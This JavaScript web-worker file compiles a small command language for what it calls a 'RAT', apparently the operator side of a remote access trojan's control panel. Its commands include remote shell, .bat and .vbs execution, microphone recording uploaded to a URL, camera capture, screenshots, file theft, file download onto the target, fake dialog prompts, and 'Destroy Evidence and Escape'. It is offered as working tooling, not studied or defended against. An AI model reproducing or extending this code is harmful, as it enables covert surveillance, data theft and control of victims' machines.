onmessage = function (event) {
 var code = ""; // Optimized code (string)
 var txt = "Code Summary:"; //Summary txt
 // General Array Format: [Error, Err desc(txt), Err desc(markup), target|class|all, target_spcified?(0|1|2|3),"empty optCode"]
 // arr[4]=> 0: Not specified, 1: Target, 2:Class, 3:All
 var arr = [false, "txt", "html", "target", 0, ""];

 const argEmpty = (str, arg) => {
  if (arg === undefined) {
   arr[0] = true;
   arr[1] = "Argument Cannot be Empty";
   arr[2] = `<red>Program Error</red><br><br>Expecting an Argument, PC.${str}(<grn>${str}_value</grn>)<br><br>Compiler failed with exit code 1F02`;
   return true;
  } else {
   return false;
  }
 };

 const multiTar = () => {
  if (arr[4] !== 0) {
   arr[0] = true;
   arr[1] = "Mulitple Target selectors detected";
   arr[2] = "<red>Program Error</red><br><br>Program contains more than one selector<br><br>Compiler failed with exit code 1F01";
   return true;
  } else {
   return false;
  }
 };

 const tarLock = (str) => {
  if (arr[4] == 1) {
   return true;
  } else {
   arr[0] = true;
   arr[1] = `${str}() Requires a Target`;
   arr[2] = `<red>Program Error</red><br><br>Expecting PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F03`;
   return false;
  }
 };

 const tarSel = (t, str) => {
  switch (t) {
   case 1:
    arr[3] = str;
    break;
   case 2:
    arr[3] = str;
    break;
   case 3:
    arr[3] = "All Systems";
    break;
  }
  arr[4] = t;
 };

 const dictionary = (fn, args) => {
  switch (fn) {
   case "Excape":
    txt += "<br>-Execute commands and Escape()";
    break;
   case "Escape":
    txt += "<br>-Destroy Evidence and Escape";
    break;
   case "Marco":
    txt += "<br>-Returns Polo if Online";
    break;
   case "Exit":
    txt += "<br>-End Execution temporarily.";
    break;
   case "Update":
    txt += "<br>-Updates firmware file";
    break;
   case "Hibernate":
    txt += "<br>- Hibernate till date";
    break;
   case "Revive":
    txt += "<br>-End Hibernation";
    break;
   case "Rename":
    txt += "<br>-Renames RAT permanently";
    break;
   case "Flash":
    txt += "<br>-Flashes Screen As a Visual Indication";
    break;
   case "Vbs":
    txt += "<br>-Runs .VBS Script remotely";
    break;
   case "Bat":
    txt += "<br>-Runs .Bat Script remotely";
    break;
   case "Shell":
    txt += "<br>-Executes Shell Commands remotely";
    break;
   case "Speak":
    txt += "<br>-Text to Speech operation";
    break;
   case "Play":
    txt += "<br>-Play an .mp3 Audio File";
    break;
   case "Mic":
    txt += "<br>-Records audio for 'x' mins";
    break;
   case "Info":
    txt += "<br>-Shows an Information box";
    break;
   case "Warn":
    txt += "<br>-Shows a Warning Box";
    break;
   case "Error":
    txt += "<br>-Shows an Error box";
    break;
   case "Timebox":
    txt += "<br>-Shows a Message Box for 'x' ms";
    break;
   case "Google":
    txt += "<br>-Googles a selected Text";
    break;
   case "Web":
    txt += "<br>-Navigates to custom url";
    break;
   case "Type":
    txt += "<br>-Types a specific text";
    break;
   case "Screenshot":
    txt += "<br>-Takes a Screenshot";
    break;
   case "Camera":
    txt += "<br>-Captures a Photo";
    break;
   case "Details":
    txt += "<br>-Retrieves PC Info";
    break;
   case "Tree":
    txt += "<br>-Retrieves Directory / Folder structures";
    break;
   case "Send":
    txt += "<br>-Sends a File (Uplinks)";
    break;
   case "Health":
    txt += "<br>-Reports back a RAT's working conditions.";
    break;
   case "Log":
    txt += "<br>-Return list of Active applications.";
    break;
   case "Delay":
    txt += "<br>-Pause Execution temporarily for 'x' ms";
    break;
   case "Shutdown":
    txt += "<br>-Shutsdown the system after 'x' ms";
    break;
   case "Clone":
    txt += "<br>-Initiate Clone Operations";
    break;
   case "NClone":
    txt += "<br>-Stops Cloning Operations";
    break;
   case "Prompt":
    txt += "<br>-Prompts User for an input.";
    break;
   case "Disk":
    txt += "<br>-Retrieves Disk Summary";
    break;
   case "Download":
    txt += "<br>-Downloads a file onto target.";
    break;
   case "ExecuteAt":
    txt += "<br>-Executes script only at specified time.";
    break;
  }
  args === undefined ? (code += `${fn}();`) : (code += `${fn}(${JSON.stringify(args)});`);
 };

 var PC = {
  // Target Selectors

  All: () => {
   !arr[0] && !multiTar() && tarSel(3);
  },
  Class: (x) => {
   !arr[0] && !multiTar() && !argEmpty("Class", x) && tarSel(2, x);
  },
  Lock: (x) => {
   !arr[0] && !multiTar() && !argEmpty("Target", x) && tarSel(1, x);
  },

  // Built-in Functions.
  //* No Arg Functions ▼

  // For Single systems.
  Marco: () => {
   !arr[0] && tarLock("Marco") && dictionary("Marco");
  },
  Details: () => {
   !arr[0] && tarLock("Details") && dictionary("Details");
  },
  Log: () => {
   !arr[0] && tarLock("Log") && dictionary("Log");
  },
  Disk: () => {
   !arr[0] && tarLock("Disk") && dictionary("Disk");
  },
  Health: () => {
   !arr[0] && tarLock("Health") && dictionary("Health");
  },

  // For Multiple systems.
  Escape: () => {
   !arr[0] && dictionary("Escape");
  },
  Exit: () => {
   !arr[0] && dictionary("Exit");
  },
  Revive: () => {
   !arr[0] && dictionary("Revive");
  },
  Flash: () => {
   !arr[0] && dictionary("Flash");
  },
  NClone: () => {
   !arr[0] && dictionary("NClone");
  },

  //* Argument Functions ▼
  // For Single systems.
  Rename: (x) => {
   !arr[0] && tarLock("Rename") && !argEmpty("Rename", x) && dictionary("Rename", x);
  },
  Camera: (x) => {
   !arr[0] && tarLock("Camera") && !argEmpty("Camera", x) && dictionary("Camera", x);
  },
  Tree: (x) => {
   !arr[0] && tarLock("Tree") && !argEmpty("Tree", x) && dictionary("Tree", x);
  },
  Send: (x) => {
   !arr[0] && tarLock("Send") && !argEmpty("Send", x) && dictionary("Send", x);
  },
  Prompt: (x) => {
   !arr[0] && tarLock("Prompt") && !argEmpty("Prompt", x) && dictionary("Prompt", x);
  },
  Clone: (x, y) => {
   if (!arr[0]) {
    if (tarLock("Clone")) {
     if (x == undefined || y == undefined) {
      arr[0] = true;
      arr[1] = "Arguments Cannot be Empty";
      arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Clone(<grn>Alias_name</grn>,<grn>Icon_url</grn>)<br><br>Compiler failed with exit code 1F04";
     } else {
      dictionary("Clone", [x, y]);
     }
    }
   }
  },
  Mic: (x, y) => {
   if (!arr[0]) {
    if (tarLock("Mic")) {
     if (x == undefined || y == undefined) {
      arr[0] = true;
      arr[1] = "Arguments Cannot be Empty";
      arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Mic(<grn>upload_url</grn>,<grn>minutes</grn>)<br><br>Compiler failed with exit code 1F05";
     } else {
      dictionary("Mic", [x, y]);
     }
    }
   }
  },

  // For Multiple systems.
  Update: (x) => {
   !arr[0] && !argEmpty("Update", x) && dictionary("Update", x);
  },
  Hibernate: (x) => {
   !arr[0] && !argEmpty("Hibernate", x) && dictionary("Hibernate", x);
  },
  Excape: (x) => {
   !arr[0] && !argEmpty("Excape", x) && dictionary("Excape", x);
  },
  Vbs: (x) => {
   !arr[0] && !argEmpty("Vbs", x) && dictionary("Vbs", x);
  },
  Bat: (x) => {
   !arr[0] && !argEmpty("Bat", x) && dictionary("Bat", x);
  },
  Shell: (x) => {
   !arr[0] && !argEmpty("Shell", x) && dictionary("Shell", x);
  },
  Speak: (x) => {
   !arr[0] && !argEmpty("Speak", x) && dictionary("Speak", x);
  },
  Play: (x) => {
   !arr[0] && !argEmpty("Play", x) && dictionary("Play", x);
  },
  Info: (x) => {
   !arr[0] && !argEmpty("Info", x) && dictionary("Info", x);
  },
  Warn: (x) => {
   !arr[0] && !argEmpty("Warn", x) && dictionary("Warn", x);
  },
  Error: (x) => {
   !arr[0] && !argEmpty("Error", x) && dictionary("Error", x);
  },
  Google: (x) => {
   !arr[0] && !argEmpty("Google", x) && dictionary("Google", x);
  },
  Web: (x) => {
   !arr[0] && !argEmpty("Web", x) && dictionary("Web", x);
  },
  Type: (x) => {
   !arr[0] && !argEmpty("Type", x) && dictionary("Type", x);
  },
  Screenshot: (x) => {
   !arr[0] && !argEmpty("Screenshot", x) && dictionary("Screenshot", x);
  },
  Delay: (x) => {
   !arr[0] && !argEmpty("Delay", x) && dictionary("Delay", x);
  },
  Shutdown: (x) => {
   !arr[0] && !argEmpty("Shutdown", x) && dictionary("Shutdown", x);
  },
  Download: (x) => {
   !arr[0] && !argEmpty("Download", x) && dictionary("Download", x);
  },
  ExecuteAt: (x) => {
   !arr[0] && !argEmpty("ExecuteAt", x) && dictionary("ExecuteAt", x);
  },
  Timebox: (a, b, c, d, e) => {
   if (!arr[0]) {
    if (a == undefined || b == undefined || c == undefined || d == undefined || e == undefined) {
     arr[0] = true;
     arr[1] = "Arguments Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting Arguments, PC.Timebox(<grn>message</grn>,<grn>button</grn>,<grn>icon</grn>,<grn>title</grn>,<grn>timeout</grn>)<br><br>Compiler failed with exit code 1F06";
    } else {
     dictionary("Timebox", [a, b, c, d, e]);
    }
   }
  },
 };

 try {
  eval(event.data);
 } catch (e) {
  arr[0] = true;
  arr[1] = e;
  arr[2] = "<red>Program Error</red><br><br>Compiler failed with exit code 1F206";
 }

 if (!arr[0] && !arr[4]) {
  arr = [true, "Target Not specified", "<red>Program Error</red><br><br>Syntax: PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F43", "", 0, ""];
 }
 arr[0] ? postMessage(arr) : txt == "Code Summary:" ? postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>- No Actions to perform.", arr[3], arr[4], code]) : postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>" + txt, arr[3], arr[4], code]);
};
